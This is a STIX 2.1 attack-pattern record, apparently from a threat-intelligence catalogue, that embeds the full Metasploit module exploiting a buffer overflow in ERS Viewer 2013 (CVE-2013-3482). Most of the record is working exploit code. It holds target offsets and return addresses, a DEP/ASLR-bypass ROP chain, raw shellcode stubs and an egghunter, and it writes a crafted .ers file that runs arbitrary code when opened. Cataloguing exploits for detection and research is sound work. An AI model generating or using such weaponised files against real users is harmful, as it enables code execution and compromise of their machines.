{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1e2abdcb-3398-41e2-aebd-a050726e2fe9",
    "created": "2024-08-14T16:38:24.450095Z",
    "modified": "2024-08-14T16:38:24.450099Z",
    "name": "\"ERS Viewer 2013 ERS File Handling Buffer Overflow\"",
    "description": " This module exploits a buffer overflow vulnerability found in ERS Viewer 2013. The vulnerability exists in the module ermapper_u.dll, where the function rf_report_error handles user provided data in an insecure way. It results in arbitrary code execution under the context of the user viewing a specially crafted .ers file. This module has been tested successfully with ERS Viewer 2013 (versions 13.0.0.1151) on Windows XP SP3 and Windows 7 SP1.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/erdas_er_viewer_rf_report_error.rb",
            "external_id": "erdas_er_viewer_rf_report_error.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3482"
        },
        {
            "source_name": "reference",
            "url": "http://web.archive.org/web/20130609135637/http://secunia.com:80/advisories/53620"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::Egghunter\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"ERS Viewer 2013 ERS File Handling Buffer Overflow\",\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability found in ERS Viewer 2013.\n        The vulnerability exists in the module ermapper_u.dll, where the function\n        rf_report_error handles user provided data in an insecure way. It results in\n        arbitrary code execution under the context of the user viewing a specially crafted\n        .ers file. This module has been tested successfully with ERS Viewer 2013 (versions\n        13.0.0.1151) on Windows XP SP3 and Windows 7 SP1.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'James Fitts', # Vulnerability Discovery\n          'juan vazquez' # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-3482' ],\n          [ 'OSVDB', '93650' ],\n          [ 'URL', 'http://web.archive.org/web/20130609135637/http://secunia.com:80/advisories/53620' ]\n        ],\n      'Payload'        =>\n        {\n          'Space'    => 4000,\n          'DisableNops' => true,\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested on Windows XP SP3\n          [ 'ERS Viewer 2013 13.0.0.1151 / NO DEP / NO ASLR',\n            {\n              'Offset' => 191,\n              'Ret' => 0x100329E9 # jmp eax # from ermapper_u.dll\n            }\n          ],\n          # Tested on Windows XP SP3 and Windows 7 SP1\n          [ 'ERS Viewer 2013 13.0.0.1151 / DEP & ASLR bypass',\n            {\n              'Offset' => 191,\n              'Ret' => 0x100E1152,     # xchg eax, esp # ret # from ermapper_u.dll\n              'RetNull' => 0x30d07f00, # ret ending with null byte # from ethrlib.dll\n              'VirtualAllocPtr' => 0x1010c0f4\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => \"May 23 2013\",\n      'DefaultTarget'  => 1))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.ers']),\n      ])\n\n  end\n\n  def create_rop_chain()\n    # rop chain generated with mona.py - www.corelan.be\n    rop_gadgets =\n      [\n        0x10082624,    # POP EAX # RETN [ermapper_u.dll]\n        0x1010c0f4,    # ptr to &VirtualAlloc() [IAT ermapper_u.dll]\n        0x1001a9c0,    # MOV EAX,DWORD PTR DS:[EAX] # RETN [ermapper_u.dll]\n        0x1005db36,    # XCHG EAX,ESI # RETN [ermapper_u.dll]\n        0x10105d87,    # POP EBX # RETN [ermapper_u.dll]\n        0xffffffff,    #\n        0x30d059d9,    # INC EBX # RETN [ethrlib.dll]\n        0x30d059d9,    # INC EBX # RETN [ethrlib.dll]\n        0x100e9dd9,    # POP EAX # RETN [ermapper_u.dll]\n        0xa2dbcf75,    # put delta into eax (-> put 0x00001000 into edx)\n        0x1001aa04,    # ADD EAX,5D24408B # RETN [ermapper_u.dll]\n        0x10016a98,    # XCHG EAX,EDX # OR EAX,4C48300 # POP EDI # POP EBP # RETN [ermapper_u.dll]\n        0x10086d21,    # RETN (ROP NOP) [ermapper_u.dll]\n        0x1001a148,    # & push esp # ret  [ermapper_u.dll]\n        0x10082624,    # POP EAX # RETN [ermapper_u.dll]\n        0xffffffc0,    # Value to negate, will become 0x00000040\n        0x100f687d,    # NEG EAX # RETN [ermapper_u.dll]\n        0x1001e720,    # XCHG EAX,ECX # ADC EAX,5DE58B10 # RETN [ermapper_u.dll]\n        0x100288b5,    # POP EAX # RETN [ermapper_u.dll]\n        0x90909090,    # nop\n        0x100e69e0,    # PUSHAD # RETN [ermapper_u.dll]\n      ].flatten.pack(\"V*\")\n\n    return rop_gadgets\n  end\n\n  # Restore the stack pointer in order to execute the final payload successfully\n  def fix_stack\n    pivot = \"\\x64\\xa1\\x18\\x00\\x00\\x00\"  # mov eax, fs:[0x18] # get teb\n    pivot << \"\\x83\\xC0\\x08\"             # add eax, byte 8 # get pointer to stacklimit\n    pivot << \"\\x8b\\x20\"                 # mov esp, [eax] # put esp at stacklimit\n    pivot << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\" # add esp, -2000 # plus a little offset\n    return pivot\n  end\n\n  # In the Windows 7 case, in order to bypass ASLR/DEP successfully, after finding\n  # the payload on memory we can't jump there directly, but allocate executable memory\n  # and jump there. Badchars: \"\\x0a\\x0d\\x00\"\n  def hunter_suffix(payload_length)\n    # push flProtect (0x40)\n    suffix = \"\\xB8\\xC0\\xFF\\xFF\\xFF\"                              # mov eax, 0xffffffc0\n    suffix << \"\\xF7\\xD8\"                                         # neg eax\n    suffix << \"\\x50\"                                             # push eax\n    # push flAllocationType (0x3000)\n    suffix << \"\\x66\\x05\\xC0\\x2F\"                                 # add ax, 0x2fc0\n    suffix << \"\\x50\"                                             # push eax\n    # push dwSize (0x1000)\n    suffix << \"\\x66\\x2D\\xFF\\x1F\"                                 # sub ax, 0x1fff\n    suffix << \"\\x48\"                                             # dec eax\n    suffix << \"\\x50\"                                             # push eax\n    # push lpAddress\n    suffix << \"\\xB8\\x0C\\x0C\\x0C\\x0C\"                             # mov eax, 0x0c0c0c0c\n    suffix << \"\\x50\" # push eax\n    # Call VirtualAlloc\n    suffix << \"\\xFF\\x15\" + [target['VirtualAllocPtr']].pack(\"V\") # call ds:VirtualAlloc\n    # Copy payload (edi) to Allocated memory (eax)\n    suffix << \"\\x89\\xFE\"                                         # mov esi, edi\n    suffix << \"\\x89\\xC7\"                                         # mov edi, eax\n    suffix << \"\\x31\\xC9\"                                         # xor ecx, ecx\n    suffix << \"\\x66\\x81\\xC1\" + [payload_length].pack(\"v\")        # add cx, payload_length\n    suffix << \"\\xF3\\xA4\"                                         # rep movsb\n    # Jmp to the final payload (eax)\n    suffix << \"\\xFF\\xE0\"                                         # jmp eax\n\n    return suffix\n  end\n\n  def exploit\n\n    #These badchars do not apply to the final payload\n    badchars = [0x0c, 0x0d, 0x0a].pack(\"C*\")\n\n    eggoptions =\n      {\n        :checksum => true,\n        :eggtag => 'w00t'\n      }\n    my_payload = fix_stack + payload.encoded\n\n    if target.name =~ /DEP & ASLR bypass/\n      # The payload length can't include NULL's in order to\n      # build the stub which will copy the final payload to\n      # executable memory\n      while [my_payload.length].pack(\"v\").include?(\"\\x00\")\n        my_payload << rand_text(1)\n      end\n    end\n\n    hunter,egg = generate_egghunter(my_payload, badchars, eggoptions)\n\n    if target.name =~ /DEP & ASLR bypass/\n      hunter.gsub!(/\\xff\\xe7/, hunter_suffix(my_payload.length))\n    end\n\n    if target.name =~ /NO DEP/\n      buf = rand_text_alpha(1)\n      buf << (0x01..0x04).to_a.pack(\"C*\") # Necessary to align EAX as expected\n      buf << \"AA\" # EAX pointing to buf[5] prefixed with 0x00 after ret\n      buf << hunter\n      buf << rand_text_alpha(target['Offset'] - buf.length)\n      buf << [target.ret].pack(\"V\") # jmp eax\n      buf << rand_text_alpha(8)\n      buf << egg\n    elsif target.name =~ /DEP & ASLR bypass/\n      buf = rand_text_alpha(1)\n      buf << (0x01..0x04).to_a.pack(\"C*\") # Necessary to align EAX as expected\n      buf << [target['RetNull']].pack(\"V\")[1,3] # EAX pointing to buf[5] prefixed with 0x00 after ret\n      buf << create_rop_chain\n      buf << hunter\n      buf << rand_text_alpha(target['Offset'] - buf.length)\n      buf << [target.ret].pack(\"V\") # xchg eax, esp # ret\n      buf << rand_text_alpha(8)\n      buf << egg\n    end\n\n    ers = %Q|\nDatasetHeader Begin\n#{buf} End\n    |\n\n    file_create(ers)\n  end\nend\n",
    "x_mitre_disclosure_date": "\"May 23 2013\"",
    "x_mitre_platforms": [
        "win'"
    ]
}